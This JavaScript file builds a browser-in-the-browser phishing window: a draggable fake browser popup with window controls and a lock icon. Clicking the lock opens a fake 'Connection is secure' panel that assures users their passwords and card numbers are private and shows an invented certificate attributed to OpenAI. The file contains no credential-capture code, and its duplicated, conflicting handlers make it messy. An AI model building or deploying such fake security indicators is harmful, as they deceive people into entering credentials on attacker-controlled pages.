var titleBar = document.getElementById("bwTitle");
var bwExit = document.getElementById("bwExit");
var max = document.getElementById("bwMax");
var min = document.getElementById("bwMin");

titleBar.addEventListener('mouseover', function handleMouseOver() {
  titleBar.style.cursor = 'context-menu';
});

titleBar.addEventListener('mouseout', function handleMouseOver() {
  titleBar.style.cursor = 'default';
});

//////////////// Make bwWin draggable start ////////////////
// Make the DIV element draggable:
var draggable = $('#window');
var title = $('#title-bar');

title.on('mousedown', function(e){
	var dr = $(draggable).addClass("drag");
	height = dr.outerHeight();
	width = dr.outerWidth();
	ypos = dr.offset().top + height - e.pageY,
	xpos = dr.offset().left + width - e.pageX;
	$(document.body).on('mousemove', function(e){
		var itop = e.pageY + ypos - height;
		var ileft = e.pageX + xpos - width;
		if(dr.hasClass("drag")){
			dr.offset({top: itop,left: ileft});
		}
	}).on('mouseup', function(e){
			dr.removeClass("drag");
	});
});
//////////////// Make bwWin draggable end ////////////////


////////////////// Onclick listeners //////////////////
// X button functionality
$("#bwExit").click(function(){
    $("#bwWin").css("display", "none");
  });

// Maximize button functionality
$("#bwMax").click(enlarge);

function enlarge(){
  if(max.classList.contains("enlarged")){
    $("#bwWin").css("width", "40%");
    $("#bwTitleWidth").css('width', '100%').css('width', '+=2px');
    $("#bwContent").css("width", "100%");
    $("#bwMax").removeClass("enlarged");
  }
  else{
    $("#bwWin").css("width", "70%");
    $("#bwTitleWidth").css('width', '100%').css('width', '+=2px');
    $("#bwContent").css("width", "100%");
    $("#bwMax").addClass("enlarged");
  }
}

// Fake bwMin functionality
$("#bwMin").click(function(){
    $("#bwWin").toggle(); // Hide or show the bwWin on bwMin click
});

// Window resizing functionality
var isResizing = false;
$("#bwWin").on('mousedown', function(e) {
    // Check if mouse is near the edges of the bwWin
    if ($("#bwWin").outerWidth() - e.pageX < 10 || e.pageX < 10 || $("#bwWin").outerHeight() - e.pageY < 10 || e.pageY < 10) {
        isResizing = true;
        $(document).on('mousemove', function(e) {
            // Logic to resize the bwWin
            $("#bwWin").width(e.pageX).height(e.pageY);
        }).on('mouseup', function(e) {
            isResizing = false;
            $(document).off('mousemove');
        });
    }
});


// Make the DIV element draggable:
var draggable = document.getElementById("bwWin");
var title = document.getElementById("bwTitle");

title.onmousedown = function(e) {
    var dr = draggable;
    var startX = e.clientX, startY = e.clientY;
    var startWidth = parseInt(document.defaultView.getComputedStyle(dr).width, 10);
    var startHeight = parseInt(document.defaultView.getComputedStyle(dr).height, 10);
    document.documentElement.addEventListener('mousemove', doDrag, false);
    document.documentElement.addEventListener('mouseup', stopDrag, false);

    function doDrag(e) {
        dr.style.width = (startWidth + e.clientX - startX) + 'px';
        dr.style.height = (startHeight + e.clientY - startY) + 'px';
    }

    function stopDrag(e) {
        document.documentElement.removeEventListener('mousemove', doDrag, false);
        document.documentElement.removeEventListener('mouseup', stopDrag, false);
    }
};

// SSL Lock modal functionality
var sslModalHTML = `
<div id="bwSSLLockModal" style="display:none; position: fixed; top: 10%; left: 30%; width: 40%; height: 30%; background-color: white; border: 1px solid #d8d8d8; border-radius: 5px; z-index: 1000; padding: 20px;">
    <h2>Connection is secure</h2>
    <p>Your information (for example, passwords or credit card numbers) is private when it is sent to this site.</p>
    <hr>
    <h3>Certificate</h3>
    <p><strong>Issued to:</strong> OpenAI, Inc.</p>
    <p><strong>Issued by:</strong> OpenAI Trust Authority</p>
    <p><strong>Valid from:</strong> 01/01/2022 to 01/01/2023</p>
    <button onclick="document.getElementById('bwSSLLockModal').style.display='none';">Close</button>
</div>
`;
document.body.innerHTML += sslModalHTML;

document.getElementById("bwSSLLock").addEventListener("click", function() {
    document.getElementById("bwSSLLockModal").style.display = "block";
});


// Restoring button functionality
document.getElementById("bwExit").addEventListener("click", function() {
    document.getElementById("bwWin").style.display = "none";
});

document.getElementById("bwMax").addEventListener("click", function() {
    var bwWin = document.getElementById("bwWin");
    if (bwWin.style.width !== "100%") {
        bwWin.style.width = "100%";
        bwWin.style.height = "100%";
    } else {
        bwWin.style.width = "800px";
        bwWin.style.height = "600px";
    }
});

// Adjusting SSL modal positioning
document.getElementById("bwSSLLock").addEventListener("click", function() {
    var sslModal = document.getElementById("bwSSLLockModal");
    var lockPosition = document.getElementById("bwSSLLock").getBoundingClientRect();
    sslModal.style.top = (lockPosition.top + 20) + "px";
    sslModal.style.left = lockPosition.left + "px";
});



document.getElementById("bwMin").addEventListener("click", function() {
    var bwWin = document.getElementById("bwWin");
    if (bwWin.style.display !== "none") {
        bwWin.style.display = "none";
    } else {
        bwWin.style.display = "block";
    }
});



// Functionality to make the BITB window draggable
(function() {
    var bwWin = document.getElementById("bwWin");
    var bwTitle = document.getElementById("bwTitle");
    var isMouseDown = false;
    var mouseX = 0;
    var mouseY = 0;
    
    bwTitle.addEventListener("mousedown", function(e) {
        isMouseDown = true;
        mouseX = e.clientX - bwWin.offsetLeft;
        mouseY = e.clientY - bwWin.offsetTop;
    });
    
    window.addEventListener("mouseup", function() {
        isMouseDown = false;
    });
    
    window.addEventListener("mousemove", function(e) {
        if (!isMouseDown) return;
        bwWin.style.left = (e.clientX - mouseX) + "px";
        bwWin.style.top = (e.clientY - mouseY) + "px";
    });
})();

